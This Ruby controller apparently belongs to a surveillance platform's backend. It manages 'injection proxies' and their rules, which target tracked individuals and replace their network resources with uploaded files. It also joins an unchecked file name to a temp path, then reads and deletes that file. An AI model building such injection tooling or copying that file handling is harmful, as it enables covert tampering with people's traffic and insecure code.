#
# Controller for the Proxy objects
#

module RCS
module DB

class ProxyController < RESTController

  def index
    require_auth_level :server, :sys, :tech

    mongoid_query do
      result = ::Proxy.all
      #TODO: filter on target if you have the right access

      return RESTController.reply.ok(result)
    end
  end

  def show
    require_auth_level :server, :sys, :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      return RESTController.reply.ok(proxy)
    end
  end

  def create
    require_auth_level :sys

    return RESTController.reply.conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :proxies

    result = Proxy.create(name: @params['name'], port: 4444, poll: false, configured: false, redirect: 'auto')

    Audit.log :actor => @session[:user][:name], :action => 'proxy.create', :desc => "Created the injection proxy '#{@params['name']}'"

    return RESTController.reply.ok(result)
  end

  def update
    require_auth_level :sys

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if proxy[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name], :action => 'proxy.update', :desc => "Updated '#{key}' to '#{value}' for injection proxy '#{proxy['name']}'"
        end
      end

      proxy.update_attributes(@params)

      return RESTController.reply.ok(proxy)
    end
  end

  def destroy
    require_auth_level :sys

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      proxy_name = proxy.name

      proxy.rules.each do |rule|
        GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
      end
      
      proxy.destroy
      Audit.log :actor => @session[:user][:name], :action => 'proxy.destroy', :desc => "Deleted the injection proxy '#{proxy_name}'"
      
      return RESTController.reply.ok
    end
  end

  def version
    require_auth_level :server

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      @params.delete('_id')

      proxy.version = @params['version']
      proxy.save

      return RESTController.reply.ok
    end
  end

  def config
    require_auth_level :server
    
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])

      #TODO: implement config retrieval
      proxy.rules.each do |rule|
        puts rule.inspect
      end

      proxy.configured = true
      proxy.save

      return RESTController.reply.not_found
    end
  end

  def logs
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])

      case @request[:method]
        when 'GET'
          require_auth_level :sys, :tech
          
          klass = CappedLog.collection_class proxy[:_id]
          logs = klass.all
          return RESTController.reply.ok(logs)

        when 'POST'
          require_auth_level :server

          entry = CappedLog.dynamic_new proxy[:_id]
          entry.time = Time.parse(@params['time']).getutc.to_i
          entry.type = @params['type'].downcase
          entry.desc = @params['desc']
          entry.save
          return RESTController.reply.ok
      end

      return RESTController.reply.bad_request
    end
  end

  def del_logs
    require_auth_level :sys, :tech

    mongoid_query do
      proxy = Proxy.find(@params['_id'])

      klass = CappedLog.collection_class proxy[:_id]
      klass.destroy_all

      return RESTController.reply.ok
    end
  end

  # rule creation and modification
  def add_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])

      rule = ::ProxyRule.new
      rule.enabled = @params['rule']['enabled']
      rule.probability = @params['rule']['probability']
      rule.disable_sync = @params['rule']['disable_sync']
      rule.ident = @params['rule']['ident']
      rule.ident_param = @params['rule']['ident_param']
      rule.resource = @params['rule']['resource']
      rule.action = @params['rule']['action']
      rule.action_param = @params['rule']['action_param']
      rule.action_param_name = @params['rule']['action_param_name']

      target = ::Item.find(@params['rule']['target_id'].first)
      return RESTController.reply.not_found("Target not found") if target.nil?

      rule.target_id = [ target[:_id] ]

      # the file is uploaded to the grid before calling this method
      if rule.action == 'REPLACE' and not @params['rule']['action_param'].nil?
        path = File.join Dir.tmpdir, @params['rule']['action_param']
        if File.exist?(path) and File.file?(path)
          rule[:_grid] = [GridFS.instance.put(File.binread(path), {filename: @params['rule']['action_param']})]
          File.unlink(path)
        end
      end
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.add_rule', 
                :desc => "Added a rule to the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      proxy.rules << rule
      proxy.save

      return RESTController.reply.ok(rule)
    end
  end

  def del_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      rule = proxy.rules.find(@params['rule']['_id'])
      target = ::Item.find(rule.target_id.first)

      Audit.log :actor => @session[:user][:name], :action => 'proxy.del_rule', :target => target.name,
                :desc => "Deleted a rule from the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      # delete any pending file in the grid
      GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?

      proxy.rules.delete_all(conditions: { _id: rule[:_id]})
      proxy.save

      return RESTController.reply.ok
    end
  end

  def update_rule
    require_auth_level :tech, :sys

    mongoid_query do

      proxy = ::Proxy.find(@params['_id'])
      rule = proxy.rules.find(@params['rule']['_id'])

      @params.delete('_id')
      unless @params['rule']['target_id'].nil?
        target = ::Item.find(@params['rule']['target_id'].first)
        @params['rule']['target_id'] = [ target[:_id] ]
      end

      rule.update_attributes(@params['rule'])

      # remove any grid pointer if we are changing the type of action
      if rule.action != 'REPLACE'
        GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
        rule[:_grid] = nil
      end
      
      # the file is uploaded to the grid before calling this method
      if rule.action == 'REPLACE' and not @params['rule']['action_param'].nil?
        path = File.join Dir.tmpdir, @params['rule']['action_param']
        if File.exist?(path) and File.file?(path)
          # delete any previous file in the grid
          GridFS.instance.delete rule[:_grid].first unless rule[:_grid].nil?
          rule[:_grid] = [GridFS.instance.put(File.binread(path), {filename: @params['rule']['action_param']})]
          File.unlink(path)
        end
      end

      rule.save
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.update_rule', 
                :desc => "Modified a rule on the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      return RESTController.reply.ok(rule)
    end
  end

  def apply_rules
    require_auth_level :tech
    
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.apply_rules',
                :desc => "Applied the rules to the injection proxy '#{proxy.name}'"
      
      proxy.configured = false
      proxy.save

      return RESTController.reply.ok
    end
  end

end

end #DB::
end #RCS::
